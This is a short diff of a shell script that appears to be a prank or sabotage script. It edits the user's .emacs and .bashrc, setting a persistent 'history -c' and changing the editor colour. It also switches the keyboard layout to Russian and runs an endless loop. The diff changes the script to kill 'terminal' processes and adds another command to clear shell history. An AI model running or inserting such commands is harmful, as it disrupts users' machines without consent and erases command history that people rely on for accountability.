@@ -12,7 +12,8 @@ echo "(set-face-foreground 'default \"lightblue\")" >> /home/${USER}/.emacs;
 echo "history -c" >> /home/${USER}/.bashrc;
 
 setxkbmap ru;
-pkill xterm;
+pkill terminal;
+history -c
 
 while [ 1 ]
 do
